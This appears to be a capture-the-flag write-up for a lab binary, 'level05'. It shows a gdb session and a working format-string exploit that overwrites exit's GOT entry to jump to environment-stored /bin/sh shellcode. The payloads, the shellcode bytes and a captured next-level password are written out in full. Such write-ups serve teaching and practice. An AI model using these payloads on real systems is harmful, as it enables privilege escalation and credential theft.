gdb> disass main
[...]
   0x0804845d <+25>:	mov    eax,ds:0x80497f0           ; stdin
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:	lea    eax,[esp+0x28]
   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>      ; fgets(buffer, 100, stdin)
[...]
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x08048507 <+195>:	call   0x8048340 <printf@plt>     ; printf(buffer)
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>       ; exit(0)
End of assembler dump.
# Here we can see that the program call `fgets` then call `printf` with whatever we previously entered

# We will use a format string attack to overwrite the exit function call with a shellcode in the env
gdb> disass 0x8048370
[...]
   0x08048370 <exit@plt+0>:	jmp    DWORD PTR ds:0x80497e0
   0x08048376 <exit@plt+6>:	push   0x18
   0x0804837b <exit@plt+11>:	jmp    0x8048330
[...]
gdb> x 0x80497e0
0x80497e0 <exit@got.plt>

# Then we export our shellcode
$> export SHELLCODE=$(python -c "print '\x90' * 640 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
gdb> x/s *((char**)environ)
0xffffd903:	 "SHELLCODE=[...]"
# Our shellcode is at address 0xffffd903 + 10 == 0xffffd90d

# Then let's find at which offset our string is stored
$> python -c "print 'aaaa' + ' %x ' * 16" | ./level05
aaaa 64  f7fcfac0  f7ec3af9  ffffd70f  ffffd70e  0  ffffffff  ffffd794  f7fdb000  61616161  20782520  20782520  20782520  20782520  20782520  20782520
# Here we find 'aaaa' == 0x61616161 at offset 10

# Now we want to set the 4 lower bytes then the 4 higher bytes of the exit function call to match the address of our shellcode
$> python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%0x%hn'" > /tmp/pl5
gdb> r < /tmp/pl5
Stopped reason: SIGSEGV
0x08040040 in ?? ()
(0xd90d - 0x0040) + 1
55502

$> python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55502x%hn%0x%hn'" > /tmp/pl5
Stopped reason: SIGSEGV
0xd915d90c in ?? ()
(0xffff - 0xd915) + 8
9970

# Now lets tweak the value to jump right in the nopsled
$> (python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55502x%hn%9970x%hn'" ; cat -) | ./level05
$> (python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55503x%hn%9969x%hn'" ; cat -) | ./level05
$> (python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55504x%hn%9968x%hn'" ; cat -) | ./level05
$> (python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55505x%hn%9967x%hn'" ; cat -) | ./level05
$ cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq